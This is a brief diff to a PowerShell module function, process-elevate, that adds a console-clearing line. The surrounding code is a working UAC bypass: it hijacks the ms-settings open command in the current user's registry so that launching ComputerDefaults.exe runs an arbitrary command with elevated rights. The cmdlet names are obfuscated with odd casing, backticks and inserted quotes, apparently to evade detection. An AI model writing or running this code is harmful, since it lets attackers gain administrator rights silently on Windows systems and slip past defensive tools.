@@ -242,6 +242,7 @@ function process-elevate {
 nEw-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
 N`e`w-It`e`mProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -force
 S'e't-It'emPr'operty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$Request" -Force
+clear
 sTaRt-PrOcESs "C:\Windows\System32\ComputerDefaults.exe"
 }
 Export-ModuleMember -Function process-elevate
